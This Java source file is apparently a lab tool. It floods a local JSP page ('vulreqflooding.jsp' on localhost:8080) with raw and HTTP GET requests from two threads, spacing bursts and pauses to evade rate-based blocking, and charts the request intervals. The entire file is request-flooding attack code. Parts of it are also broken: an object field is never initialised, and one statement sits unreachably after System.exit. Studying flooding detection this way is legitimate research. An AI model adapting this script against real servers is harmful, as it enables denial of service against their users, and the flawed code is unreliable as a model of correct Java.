import java.net.*;
import org.jfree.chart.*;
import org.jfree.chart.plot.PlotOrientation;
import org.jfree.data.xy.*;
import org.jfree.data.*;
import java.io.*;
import java.util.*;
class NewThread implements Runnable {
   Thread t;
   TrustedRequestIntervalAttack d;
   NewThread() {
      // Create a new, second thread
      t = new Thread(this, "Demo Thread");
      System.out.println("Child thread: " + t);

              t.start(); // Start the thread
   }

   // This is the entry point for the second thread.
   public void run() {
  if(d.f==1)
  {
      try
      {t.sleep(2900);d.f=0;}catch(Exception e){}
  }
       try {
         for(int i = 1; i < 100000; i++) {

            System.out.println("Child Thread: " + i);
            // Let the thread sleep for a while.
            try
{
  URL u= new URL("http://localhost:8080/WebModule/vulreqflooding.jsp");
  HttpURLConnection uc=(HttpURLConnection) u.openConnection();
  int code=uc.getResponseCode();
if(code==403)

{ System.out.println("Site Blocks");
System.exit(0);
  d.z=1;

}

  System.out.println(code);
             }
catch(MalformedURLException ex)
{
    System.out.println(ex);
}
catch(IOException ex)
{
System.out.println(ex);
}
            Thread.sleep(0);
         }
     } catch (InterruptedException e) {
         System.out.println("Child interrupted.");
     }
     System.out.println("Exiting child thread.");
   }
}
class TrustedRequestIntervalAttack {
  public static int z=0,f=0;
   public static void main(String args[]) {
Random rand=new Random();
       new NewThread(); // create a new thread
     String target="127.0.0.1";
     Socket net;
     int k=0,j;
     XYSeries series = new XYSeries("Average Response time");
      try {
         for(int i = 1; i < 100000; i++) {
            try {
               net = new Socket(target, 8080);

               sendRawLine("GET /WebModule/vulreqflooding.jsp HTTP/1.1", net);

               sendRawLine("Host: " + target, net);


              sendRawLine("Connection: close",net );
              if(i%25==0)
{
        f=1;
int n=25;
System.out.println("inside if");
while(n!=0)
      {
      series.add(i,0);
      n--;
      i++;
      }
try
{Thread.sleep(3000);
}
catch(Exception e)
{}
        }
try{Thread.sleep(1);}catch(Exception e){}

        series.add(i,1);
          if(z==1)
            {
               
             XYDataset xyDataset = new XYSeriesCollection(series);
	JFreeChart chart = ChartFactory.createXYLineChart
		      ("Request Interval Variation","Requests","Request Interval", xyDataset, PlotOrientation.VERTICAL, true, true, false);
	ChartFrame frame1=new ChartFrame("XYLine Chart",chart);
	frame1.setVisible(true);
	frame1.setSize(800,800);
try {
ChartUtilities.saveChartAsPNG(new File("C:/TrustedRequestIntervalAttack.png"),chart,
400, 300);
} catch (IOException e) {
System.out.println("Problem in creating chart.");
}z=0;
        System.exit(0);
            }

               System.out.println("stress limit..."+i);
              }

                 catch(UnknownHostException e)

                 {
                  System.out.println(" unkwownhost error");
                 }

                 catch(IOException e)
                 {

                    System.out.println(e);
                 }


             System.out.println("Main Thread: " + i);
           Thread.sleep(200);
         }
      } catch (InterruptedException e) {
         System.out.println("Main thread interrupted.");
      }
      System.out.println("Main thread exiting.");
   }
    public static void sendRawLine(String text, Socket sock)
   {
      try {
          System.out.println("Sucessfull flooding....");
         BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
         out.write(text+"\n");
         out.flush();
      } catch(IOException ex) {
         ex.printStackTrace();
      }
    }
}